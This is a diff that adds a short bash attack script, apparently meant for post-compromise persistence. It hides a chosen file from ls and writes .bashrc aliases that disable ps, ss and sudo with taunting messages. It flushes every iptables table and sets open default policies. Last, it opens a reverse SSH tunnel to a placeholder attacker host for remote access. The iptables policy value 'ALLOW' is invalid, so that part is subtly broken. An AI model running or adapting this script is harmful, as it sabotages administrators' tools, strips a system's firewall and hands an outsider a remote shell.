@@ -1,0 +1,35 @@
+#!/bin/bash
+
+# Execute real 'ls' command and hide files
+command ls | grep -v FILE_TO_HIDE_HERE
+
+# Add lines to their .bashrc
+# Every good script needs some psychological warfare
+echo "alias ps=echo 'error: you cannot perform this operation unless you are root' " >> ~/.bashrc 
+
+echo "alias ss=echo 'error: you cannot perform this operation unless you are root' " >> ~/.bashrc
+
+echo "alias sudo=echo 'Simon says... oh wait, Simon didn't say' " >> ~/.bashrc
+
+# Flush iptables rules
+command iptables -F
+command iptables -t mangle -F
+command iptables -t nat -F
+command iptables -t filter -F
+command iptables -t raw -F
+command iptables -t security -F
+
+# Change default policies for 'iptables'
+iptables -P INPUT ALLOW
+iptables -P OUTPUT ALLOW
+iptables -P FORWARD ALLOW
+
+# Open up reverse SSH connection
+ssh -R 34567:localhost:22 root@IP_FOR_ATTACKER_PC_HERE
+
+
+
+
+
+
+ 
